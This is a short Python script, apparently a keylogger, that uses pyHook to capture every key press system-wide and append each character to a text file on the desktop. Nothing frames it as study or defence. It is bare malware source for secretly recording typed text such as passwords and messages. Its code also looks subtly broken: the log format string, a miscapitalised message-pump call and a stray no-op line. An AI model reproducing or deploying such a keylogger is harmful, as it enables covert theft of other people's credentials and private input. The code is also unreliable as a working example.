import sys, logging
import pyHook, pythoncom

logFileDest = 'C:\\Desktop\\logfile.txt'

def OnKeyboardEvent(event):
	logging.basicConfig(filename = logFileDest, level = logging.DEBUG, format ='{message}')
	chr(event.Ascii)
	logging.log(10,chr(event.Ascii))
	return True

hooksManager = pyHook.HookManager()
hooksManager.KeyDown = OnKeyboardEvent
hooksManager.HookKeyboard()
pythoncom.pumpMessages()

